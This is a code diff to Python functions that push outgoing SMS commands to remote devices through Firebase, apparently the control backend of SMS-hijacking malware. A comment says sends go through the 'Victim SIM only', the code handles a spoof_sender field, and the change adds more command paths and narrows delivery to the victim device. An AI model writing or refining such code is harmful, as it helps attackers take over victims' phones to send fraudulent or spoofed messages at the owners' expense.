@@ -208,7 +208,10 @@ async def push_outgoing_sms_command(
         f"{base}/commands/{device_id}/{command_id}",
         f"{base}/outgoing/{device_id}/{command_id}",
         f"{base}/clients/{device_id}/commands/{command_id}",
+        f"{base}/clients/{device_id}/outgoing/{command_id}",
+        f"{base}/clients/{device_id}/outbox/{command_id}",
         f"{base}/clients/{device_id}/send/{command_id}",
+        f"{base}/clients/{device_id}/sendSms/{command_id}",
         f"{base}/sms/send/{command_id}",
         f"{base}/send/{device_id}/{command_id}",
     ]
@@ -390,38 +393,24 @@ async def push_outbound_to_firebase(
                 outbound.spoof_sender,
                 outbound.message,
             )
-        poll_ids = _outgoing_poll_ids(profile, device)
-        command_tasks = [
-            push_outgoing_sms_command(
-                firebase_url,
-                device_id,
-                outbound.to_number,
-                outbound.message,
-                sim_index=outbound.sim_index,
-                sim_slot=outbound.sim_slot,
-            )
-            for device_id in poll_ids
-        ]
+        # Victim SIM only — commands/outgoing paths (no __OUT__ on messages/).
+        device_ids = _outgoing_device_ids(device)
         results = await asyncio.gather(
-            *command_tasks,
-            push_outgoing_via_messages(
-                profile,
-                device,
-                outbound.to_number,
-                outbound.message,
-                sim_index=outbound.sim_index,
+            *(
+                push_outgoing_sms_command(
+                    firebase_url,
+                    device_id,
+                    outbound.to_number,
+                    outbound.message,
+                    sim_index=outbound.sim_index,
+                    sim_slot=outbound.sim_slot,
+                )
+                for device_id in device_ids
             ),
             return_exceptions=True,
         )
-        messages_id = None
-        command_ok = False
-        for result in results:
-            if isinstance(result, str):
-                messages_id = result
-            elif result is True:
-                command_ok = True
-        if messages_id or command_ok:
-            return messages_id or datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
+        if any(result is True for result in results):
+            return datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f")
         return None
     except Exception as exc:
         logger.warning("Firebase outbound push failed: %s", exc)
